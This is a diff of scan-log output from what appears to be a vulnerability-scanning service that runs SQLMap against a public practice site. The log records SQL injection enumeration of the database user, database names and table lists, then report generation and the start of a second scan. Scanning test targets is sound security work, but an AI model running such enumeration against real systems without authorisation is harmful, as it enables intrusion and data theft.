+[2026-01-07 14:57:26] [SQLMap] [14:57:26] [WARNING] the SQL query provided does not return any output
+[2026-01-07 14:57:26] [SQLMap] [14:57:26] [INFO] fetching database users
+[2026-01-07 14:57:26] [SQLMap] [14:57:26] [INFO] retrieved: ''acuart'@'localhost''
+[2026-01-07 14:57:26] [SQLMap] [14:57:26] [INFO] fetching number of password hashes for user 'acuart'
+[2026-01-07 14:57:26] [SQLMap] [14:57:26] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[2026-01-07 14:57:28] [SQLMap] [14:57:26] [INFO] retrieved:
+[2026-01-07 14:57:35] [SQLMap] [14:57:28] [INFO] retrieved: [14:57:28] [WARNING] time-based comparison requires larger statistical model, please wait...................... (done)
+[2026-01-07 14:57:36] [SQLMap] [14:57:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+[2026-01-07 14:57:37] [SQLMap] [14:57:36] [INFO] retrieved:
+[2026-01-07 14:57:38] [SQLMap] [14:57:37] [INFO] retrieved:
+[2026-01-07 14:57:38] [SQLMap] [14:57:38] [WARNING] unable to retrieve the number of password hashes for user 'acuart'
+[2026-01-07 14:57:38] [SQLMap] [14:57:38] [ERROR] unable to retrieve the password hashes for the database users
+[2026-01-07 14:57:38] [SQLMap] [14:57:38] [INFO] fetching database names
+[2026-01-07 14:57:39] [SQLMap] [14:57:39] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:39] [SQLMap] [14:57:39] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:39] [SQLMap] available databases [2]:
+[2026-01-07 14:57:39] [SQLMap] [*] acuart
+[2026-01-07 14:57:39] [SQLMap] [*] information_schema
+[2026-01-07 14:57:39] [SQLMap] [14:57:39] [INFO] fetching tables for databases: 'acuart, information_schema'
+[2026-01-07 14:57:40] [SQLMap] [14:57:40] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:40] [SQLMap] [14:57:40] [INFO] retrieved: 'artists'
+[2026-01-07 14:57:41] [SQLMap] [14:57:41] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:41] [SQLMap] [14:57:41] [INFO] retrieved: 'carts'
+[2026-01-07 14:57:41] [SQLMap] [14:57:41] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:42] [SQLMap] [14:57:42] [INFO] retrieved: 'categ'
+[2026-01-07 14:57:42] [SQLMap] [14:57:42] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:42] [SQLMap] [14:57:42] [INFO] retrieved: 'featured'
+[2026-01-07 14:57:43] [SQLMap] [14:57:43] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:43] [SQLMap] [14:57:43] [INFO] retrieved: 'guestbook'
+[2026-01-07 14:57:43] [SQLMap] [14:57:43] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:44] [SQLMap] [14:57:44] [INFO] retrieved: 'pictures'
+[2026-01-07 14:57:44] [SQLMap] [14:57:44] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:44] [SQLMap] [14:57:44] [INFO] retrieved: 'products'
+[2026-01-07 14:57:44] [SQLMap] [14:57:44] [INFO] retrieved: 'acuart'
+[2026-01-07 14:57:45] [SQLMap] [14:57:45] [INFO] retrieved: 'users'
+[2026-01-07 14:57:45] [SQLMap] [14:57:45] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:45] [SQLMap] [14:57:45] [INFO] retrieved: 'ADMINISTRABLE_ROLE_AUTHORIZATIONS'
+[2026-01-07 14:57:46] [SQLMap] [14:57:46] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:46] [SQLMap] [14:57:46] [INFO] retrieved: 'APPLICABLE_ROLES'
+[2026-01-07 14:57:46] [SQLMap] [14:57:46] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:47] [SQLMap] [14:57:47] [INFO] retrieved: 'CHARACTER_SETS'
+[2026-01-07 14:57:47] [SQLMap] [14:57:47] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:47] [SQLMap] [14:57:47] [INFO] retrieved: 'CHECK_CONSTRAINTS'
+[2026-01-07 14:57:48] [SQLMap] [14:57:48] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:48] [SQLMap] [14:57:48] [INFO] retrieved: 'COLLATIONS'
+[2026-01-07 14:57:48] [SQLMap] [14:57:48] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:49] [SQLMap] [14:57:49] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
+[2026-01-07 14:57:49] [SQLMap] [14:57:49] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:50] [SQLMap] [14:57:50] [INFO] retrieved: 'COLUMNS'
+[2026-01-07 14:57:50] [SQLMap] [14:57:50] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:50] [SQLMap] [14:57:50] [INFO] retrieved: 'COLUMNS_EXTENSIONS'
+[2026-01-07 14:57:51] [SQLMap] [14:57:51] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:51] [SQLMap] [14:57:51] [INFO] retrieved: 'COLUMN_PRIVILEGES'
+[2026-01-07 14:57:51] [SQLMap] [14:57:51] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:51] [SQLMap] [14:57:51] [INFO] retrieved: 'COLUMN_STATISTICS'
+[2026-01-07 14:57:52] [SQLMap] [14:57:52] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:52] [SQLMap] [14:57:52] [INFO] retrieved: 'ENABLED_ROLES'
+[2026-01-07 14:57:54] [SQLMap] [14:57:54] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:55] [SQLMap] [14:57:55] [INFO] retrieved: 'ENGINES'
+[2026-01-07 14:57:55] [SQLMap] [14:57:55] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:55] [SQLMap] [14:57:55] [INFO] retrieved: 'EVENTS'
+[2026-01-07 14:57:55] [SQLMap] [14:57:55] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:56] [SQLMap] [14:57:56] [INFO] retrieved: 'FILES'
+[2026-01-07 14:57:56] [SQLMap] [14:57:56] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:56] [SQLMap] [14:57:56] [INFO] retrieved: 'INNODB_BUFFER_PAGE'
+[2026-01-07 14:57:57] [SQLMap] [14:57:57] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:57] [SQLMap] [14:57:57] [INFO] retrieved: 'INNODB_BUFFER_PAGE_LRU'
+[2026-01-07 14:57:57] [SQLMap] [14:57:57] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:58] [SQLMap] [14:57:58] [INFO] retrieved: 'INNODB_BUFFER_POOL_STATS'
+[2026-01-07 14:57:58] [SQLMap] [14:57:58] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:58] [SQLMap] [14:57:58] [INFO] retrieved: 'INNODB_CACHED_INDEXES'
+[2026-01-07 14:57:59] [SQLMap] [14:57:59] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:59] [SQLMap] [14:57:59] [INFO] retrieved: 'INNODB_CMP'
+[2026-01-07 14:57:59] [SQLMap] [14:57:59] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:57:59] [SQLMap] [14:57:59] [INFO] retrieved: 'INNODB_CMPMEM'
+[2026-01-07 14:58:00] [SQLMap] [14:58:00] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:00] [SQLMap] [14:58:00] [INFO] retrieved: 'INNODB_CMPMEM_RESET'
+[2026-01-07 14:58:00] [SQLMap] [14:58:00] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:01] [SQLMap] [14:58:01] [INFO] retrieved: 'INNODB_CMP_PER_INDEX'
+[2026-01-07 14:58:01] [SQLMap] [14:58:01] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:01] [SQLMap] [14:58:01] [INFO] retrieved: 'INNODB_CMP_PER_INDEX_RESET'
+[2026-01-07 14:58:02] [SQLMap] [14:58:02] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:02] [SQLMap] [14:58:02] [INFO] retrieved: 'INNODB_CMP_RESET'
+[2026-01-07 14:58:02] [SQLMap] [14:58:02] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:03] [SQLMap] [14:58:03] [INFO] retrieved: 'INNODB_COLUMNS'
+[2026-01-07 14:58:03] [SQLMap] [14:58:03] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:03] [SQLMap] [14:58:03] [INFO] retrieved: 'INNODB_DATAFILES'
+[2026-01-07 14:58:03] [SQLMap] [14:58:03] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:04] [SQLMap] [14:58:04] [INFO] retrieved: 'INNODB_FIELDS'
+[2026-01-07 14:58:04] [SQLMap] [14:58:04] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:05] [SQLMap] [14:58:05] [INFO] retrieved: 'INNODB_FOREIGN'
+[2026-01-07 14:58:05] [SQLMap] [14:58:05] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:05] [SQLMap] [14:58:05] [INFO] retrieved: 'INNODB_FOREIGN_COLS'
+[2026-01-07 14:58:06] [SQLMap] [14:58:06] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:06] [SQLMap] [14:58:06] [INFO] retrieved: 'INNODB_FT_BEING_DELETED'
+[2026-01-07 14:58:06] [SQLMap] [14:58:06] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:07] [SQLMap] [14:58:07] [INFO] retrieved: 'INNODB_FT_CONFIG'
+[2026-01-07 14:58:07] [SQLMap] [14:58:07] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:07] [SQLMap] [14:58:07] [INFO] retrieved: 'INNODB_FT_DEFAULT_STOPWORD'
+[2026-01-07 14:58:07] [SQLMap] [14:58:07] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:08] [SQLMap] [14:58:08] [INFO] retrieved: 'INNODB_FT_DELETED'
+[2026-01-07 14:58:08] [SQLMap] [14:58:08] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:09] [SQLMap] [14:58:09] [INFO] retrieved: 'INNODB_FT_INDEX_CACHE'
+[2026-01-07 14:58:09] [SQLMap] [14:58:09] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:09] [SQLMap] [14:58:09] [INFO] retrieved: 'INNODB_FT_INDEX_TABLE'
+[2026-01-07 14:58:10] [SQLMap] [14:58:10] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:10] [SQLMap] [14:58:10] [INFO] retrieved: 'INNODB_INDEXES'
+[2026-01-07 14:58:10] [SQLMap] [14:58:10] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:11] [SQLMap] [14:58:11] [INFO] retrieved: 'INNODB_METRICS'
+[2026-01-07 14:58:11] [SQLMap] [14:58:11] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:11] [SQLMap] [14:58:11] [INFO] retrieved: 'INNODB_SESSION_TEMP_TABLESPACES'
+[2026-01-07 14:58:11] [SQLMap] [14:58:11] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:12] [SQLMap] [14:58:12] [INFO] retrieved: 'INNODB_TABLES'
+[2026-01-07 14:58:12] [SQLMap] [14:58:12] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:12] [SQLMap] [14:58:12] [INFO] retrieved: 'INNODB_TABLESPACES'
+[2026-01-07 14:58:13] [SQLMap] [14:58:13] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:13] [SQLMap] [14:58:13] [INFO] retrieved: 'INNODB_TABLESPACES_BRIEF'
+[2026-01-07 14:58:13] [SQLMap] [14:58:13] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:14] [SQLMap] [14:58:14] [INFO] retrieved: 'INNODB_TABLESTATS'
+[2026-01-07 14:58:14] [SQLMap] [14:58:14] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:15] [SQLMap] [14:58:15] [INFO] retrieved: 'INNODB_TEMP_TABLE_INFO'
+[2026-01-07 14:58:15] [SQLMap] [14:58:15] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:15] [SQLMap] [14:58:15] [INFO] retrieved: 'INNODB_TRX'
+[2026-01-07 14:58:16] [SQLMap] [14:58:16] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:16] [SQLMap] [14:58:16] [INFO] retrieved: 'INNODB_VIRTUAL'
+[2026-01-07 14:58:16] [SQLMap] [14:58:16] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:17] [SQLMap] [14:58:17] [INFO] retrieved: 'KEYWORDS'
+[2026-01-07 14:58:17] [SQLMap] [14:58:17] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:17] [SQLMap] [14:58:17] [INFO] retrieved: 'KEY_COLUMN_USAGE'
+[2026-01-07 14:58:18] [SQLMap] [14:58:18] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:18] [SQLMap] [14:58:18] [INFO] retrieved: 'OPTIMIZER_TRACE'
+[2026-01-07 14:58:18] [SQLMap] [14:58:18] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:19] [SQLMap] [14:58:19] [INFO] retrieved: 'PARAMETERS'
+[2026-01-07 14:58:19] [SQLMap] [14:58:19] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:19] [SQLMap] [14:58:19] [INFO] retrieved: 'PARTITIONS'
+[2026-01-07 14:58:19] [SQLMap] [14:58:19] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:20] [SQLMap] [14:58:20] [INFO] retrieved: 'PLUGINS'
+[2026-01-07 14:58:20] [SQLMap] [14:58:20] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:20] [SQLMap] [14:58:20] [INFO] retrieved: 'PROCESSLIST'
+[2026-01-07 14:58:21] [SQLMap] [14:58:21] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:21] [SQLMap] [14:58:21] [INFO] retrieved: 'PROFILING'
+[2026-01-07 14:58:21] [SQLMap] [14:58:21] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:22] [SQLMap] [14:58:22] [INFO] retrieved: 'REFERENTIAL_CONSTRAINTS'
+[2026-01-07 14:58:22] [SQLMap] [14:58:22] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:22] [SQLMap] [14:58:22] [INFO] retrieved: 'RESOURCE_GROUPS'
+[2026-01-07 14:58:23] [SQLMap] [14:58:23] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:23] [SQLMap] [14:58:23] [INFO] retrieved: 'ROLE_COLUMN_GRANTS'
+[2026-01-07 14:58:23] [SQLMap] [14:58:23] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:23] [SQLMap] [14:58:23] [INFO] retrieved: 'ROLE_ROUTINE_GRANTS'
+[2026-01-07 14:58:24] [SQLMap] [14:58:24] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:24] [SQLMap] [14:58:24] [INFO] retrieved: 'ROLE_TABLE_GRANTS'
+[2026-01-07 14:58:24] [SQLMap] [14:58:24] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:25] [SQLMap] [14:58:25] [INFO] retrieved: 'ROUTINES'
+[2026-01-07 14:58:25] [SQLMap] [14:58:25] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:25] [SQLMap] [14:58:25] [INFO] retrieved: 'SCHEMATA'
+[2026-01-07 14:58:26] [SQLMap] [14:58:26] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:26] [SQLMap] [14:58:26] [INFO] retrieved: 'SCHEMATA_EXTENSIONS'
+[2026-01-07 14:58:26] [SQLMap] [14:58:26] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:27] [SQLMap] [14:58:27] [INFO] retrieved: 'SCHEMA_PRIVILEGES'
+[2026-01-07 14:58:27] [SQLMap] [14:58:27] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:27] [SQLMap] [14:58:27] [INFO] retrieved: 'STATISTICS'
+[2026-01-07 14:58:27] [SQLMap] [14:58:27] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:28] [SQLMap] [14:58:28] [INFO] retrieved: 'ST_GEOMETRY_COLUMNS'
+[2026-01-07 14:58:28] [SQLMap] [14:58:28] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:28] [SQLMap] [14:58:28] [INFO] retrieved: 'ST_SPATIAL_REFERENCE_SYSTEMS'
+[2026-01-07 14:58:29] [SQLMap] [14:58:29] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:29] [SQLMap] [14:58:29] [INFO] retrieved: 'ST_UNITS_OF_MEASURE'
+[2026-01-07 14:58:29] [SQLMap] [14:58:29] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:30] [SQLMap] [14:58:30] [INFO] retrieved: 'TABLES'
+[2026-01-07 14:58:30] [SQLMap] [14:58:30] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:30] [SQLMap] [14:58:30] [INFO] retrieved: 'TABLESPACES'
+[2026-01-07 14:58:31] [SQLMap] [14:58:31] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:31] [SQLMap] [14:58:31] [INFO] retrieved: 'TABLESPACES_EXTENSIONS'
+[2026-01-07 14:58:31] [SQLMap] [14:58:31] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:32] [SQLMap] [14:58:32] [INFO] retrieved: 'TABLES_EXTENSIONS'
+[2026-01-07 14:58:32] [SQLMap] [14:58:32] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:32] [SQLMap] [14:58:32] [INFO] retrieved: 'TABLE_CONSTRAINTS'
+[2026-01-07 14:58:33] [SQLMap] [14:58:33] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:33] [SQLMap] [14:58:33] [INFO] retrieved: 'TABLE_CONSTRAINTS_EXTENSIONS'
+[2026-01-07 14:58:33] [SQLMap] [14:58:33] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:33] [SQLMap] [14:58:33] [INFO] retrieved: 'TABLE_PRIVILEGES'
+[2026-01-07 14:58:34] [SQLMap] [14:58:34] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:34] [SQLMap] [14:58:34] [INFO] retrieved: 'TRIGGERS'
+[2026-01-07 14:58:34] [SQLMap] [14:58:34] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:35] [SQLMap] [14:58:35] [INFO] retrieved: 'USER_ATTRIBUTES'
+[2026-01-07 14:58:35] [SQLMap] [14:58:35] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:35] [SQLMap] [14:58:35] [INFO] retrieved: 'USER_PRIVILEGES'
+[2026-01-07 14:58:36] [SQLMap] [14:58:36] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:36] [SQLMap] [14:58:36] [INFO] retrieved: 'VIEWS'
+[2026-01-07 14:58:36] [SQLMap] [14:58:36] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:37] [SQLMap] [14:58:37] [INFO] retrieved: 'VIEW_ROUTINE_USAGE'
+[2026-01-07 14:58:37] [SQLMap] [14:58:37] [INFO] retrieved: 'information_schema'
+[2026-01-07 14:58:37] [SQLMap] [14:58:37] [INFO] retrieved: 'VIEW_TABLE_USAGE'
+[2026-01-07 14:58:37] [SQLMap] Database: acuart
+[2026-01-07 14:58:37] [SQLMap] [8 tables]
+[2026-01-07 14:58:37] [SQLMap] +---------------------------------------+
+[2026-01-07 14:58:37] [SQLMap] | artists                               |
+[2026-01-07 14:58:37] [SQLMap] | carts                                 |
+[2026-01-07 14:58:37] [SQLMap] | categ                                 |
+[2026-01-07 14:58:37] [SQLMap] | featured                              |
+[2026-01-07 14:58:37] [SQLMap] | guestbook                             |
+[2026-01-07 14:58:37] [SQLMap] | pictures                              |
+[2026-01-07 14:58:37] [SQLMap] | products                              |
+[2026-01-07 14:58:37] [SQLMap] | users                                 |
+[2026-01-07 14:58:37] [SQLMap] +---------------------------------------+
+[2026-01-07 14:58:37] [SQLMap] Database: information_schema
+[2026-01-07 14:58:37] [SQLMap] [79 tables]
+[2026-01-07 14:58:37] [SQLMap] +---------------------------------------+
+[2026-01-07 14:58:37] [SQLMap] | ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+[2026-01-07 14:58:37] [SQLMap] | APPLICABLE_ROLES                      |
+[2026-01-07 14:58:37] [SQLMap] | CHARACTER_SETS                        |
+[2026-01-07 14:58:37] [SQLMap] | CHECK_CONSTRAINTS                     |
+[2026-01-07 14:58:37] [SQLMap] | COLLATIONS                            |
+[2026-01-07 14:58:37] [SQLMap] | COLLATION_CHARACTER_SET_APPLICABILITY |
+[2026-01-07 14:58:37] [SQLMap] | COLUMNS_EXTENSIONS                    |
+[2026-01-07 14:58:37] [SQLMap] | COLUMN_PRIVILEGES                     |
+[2026-01-07 14:58:37] [SQLMap] | COLUMN_STATISTICS                     |
+[2026-01-07 14:58:37] [SQLMap] | ENABLED_ROLES                         |
+[2026-01-07 14:58:37] [SQLMap] | FILES                                 |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_BUFFER_PAGE                    |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_BUFFER_PAGE_LRU                |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_BUFFER_POOL_STATS              |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CACHED_INDEXES                 |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CMP                            |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CMPMEM                         |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CMPMEM_RESET                   |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CMP_PER_INDEX                  |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CMP_PER_INDEX_RESET            |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_CMP_RESET                      |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_COLUMNS                        |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_DATAFILES                      |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FIELDS                         |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FOREIGN                        |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FOREIGN_COLS                   |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FT_BEING_DELETED               |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FT_CONFIG                      |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FT_DEFAULT_STOPWORD            |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FT_DELETED                     |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FT_INDEX_CACHE                 |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_FT_INDEX_TABLE                 |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_INDEXES                        |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_METRICS                        |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_SESSION_TEMP_TABLESPACES       |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_TABLES                         |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_TABLESPACES                    |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_TABLESPACES_BRIEF              |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_TABLESTATS                     |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_TEMP_TABLE_INFO                |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_TRX                            |
+[2026-01-07 14:58:37] [SQLMap] | INNODB_VIRTUAL                        |
+[2026-01-07 14:58:37] [SQLMap] | KEYWORDS                              |
+[2026-01-07 14:58:37] [SQLMap] | KEY_COLUMN_USAGE                      |
+[2026-01-07 14:58:37] [SQLMap] | OPTIMIZER_TRACE                       |
+[2026-01-07 14:58:37] [SQLMap] | PARAMETERS                            |
+[2026-01-07 14:58:37] [SQLMap] | PROFILING                             |
+[2026-01-07 14:58:37] [SQLMap] | REFERENTIAL_CONSTRAINTS               |
+[2026-01-07 14:58:37] [SQLMap] | RESOURCE_GROUPS                       |
+[2026-01-07 14:58:37] [SQLMap] | ROLE_COLUMN_GRANTS                    |
+[2026-01-07 14:58:37] [SQLMap] | ROLE_ROUTINE_GRANTS                   |
+[2026-01-07 14:58:37] [SQLMap] | ROLE_TABLE_GRANTS                     |
+[2026-01-07 14:58:37] [SQLMap] | ROUTINES                              |
+[2026-01-07 14:58:37] [SQLMap] | SCHEMATA                              |
+[2026-01-07 14:58:37] [SQLMap] | SCHEMATA_EXTENSIONS                   |
+[2026-01-07 14:58:37] [SQLMap] | SCHEMA_PRIVILEGES                     |
+[2026-01-07 14:58:37] [SQLMap] | STATISTICS                            |
+[2026-01-07 14:58:37] [SQLMap] | ST_GEOMETRY_COLUMNS                   |
+[2026-01-07 14:58:37] [SQLMap] | ST_SPATIAL_REFERENCE_SYSTEMS          |
+[2026-01-07 14:58:37] [SQLMap] | ST_UNITS_OF_MEASURE                   |
+[2026-01-07 14:58:37] [SQLMap] | TABLESPACES                           |
+[2026-01-07 14:58:37] [SQLMap] | TABLESPACES_EXTENSIONS                |
+[2026-01-07 14:58:37] [SQLMap] | TABLES_EXTENSIONS                     |
+[2026-01-07 14:58:37] [SQLMap] | TABLE_CONSTRAINTS                     |
+[2026-01-07 14:58:37] [SQLMap] | TABLE_CONSTRAINTS_EXTENSIONS          |
+[2026-01-07 14:58:37] [SQLMap] | TABLE_PRIVILEGES                      |
+[2026-01-07 14:58:37] [SQLMap] | USER_ATTRIBUTES                       |
+[2026-01-07 14:58:37] [SQLMap] | USER_PRIVILEGES                       |
+[2026-01-07 14:58:37] [SQLMap] | VIEWS                                 |
+[2026-01-07 14:58:37] [SQLMap] | VIEW_ROUTINE_USAGE                    |
+[2026-01-07 14:58:37] [SQLMap] | VIEW_TABLE_USAGE                      |
+[2026-01-07 14:58:37] [SQLMap] | COLUMNS                               |
+[2026-01-07 14:58:37] [SQLMap] | ENGINES                               |
+[2026-01-07 14:58:37] [SQLMap] | EVENTS                                |
+[2026-01-07 14:58:37] [SQLMap] | PARTITIONS                            |
+[2026-01-07 14:58:37] [SQLMap] | PLUGINS                               |
+[2026-01-07 14:58:37] [SQLMap] | PROCESSLIST                           |
+[2026-01-07 14:58:37] [SQLMap] | TABLES                                |
+[2026-01-07 14:58:37] [SQLMap] | TRIGGERS                              |
+[2026-01-07 14:58:37] [SQLMap] +---------------------------------------+
+[2026-01-07 14:58:37] [SQLMap] SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
+[2026-01-07 14:58:37] [SQLMap] [14:58:37] [INFO] skipping 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-07 14:58:37] [SQLMap] [14:58:37] [INFO] skipping 'http://testphp.vulnweb.com/hpp/?pp=12'
+[2026-01-07 14:58:37] [SQLMap] [14:58:37] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01072026_0257pm.csv'
+[2026-01-07 14:58:38] [+] Scan Completed. Parsing results...
+[2026-01-07 14:58:38] [+] Parsed 7 vulnerabilities from log.
+[2026-01-07 14:58:38] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-01-07 14:58:38] [+] SQL scan complete. Generating PDF report...
+[2026-01-07 14:58:40] [+] PDF report generated successfully: D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.pdf
+[2026-01-07 16:31:32] [*] Starting FULL SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-01-07 16:31:32] [*] Starting FULL scan (Detection + Enumeration) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-01-07 16:31:32] [*] Executing SQLMap...
+[2026-01-07 16:31:40] [SQLMap] ___
+[2026-01-07 16:31:40] [SQLMap] __H__
+[2026-01-07 16:31:40] [SQLMap] ___ ___[']_____ ___ ___  {1.10.1.12#dev}
+[2026-01-07 16:31:40] [SQLMap] |_ -| . [,]     | .'| . |
+[2026-01-07 16:31:40] [SQLMap] |___|_  [,]_|_|_|__,|  _|
+[2026-01-07 16:31:40] [SQLMap] |_|V...       |_|   https://sqlmap.org
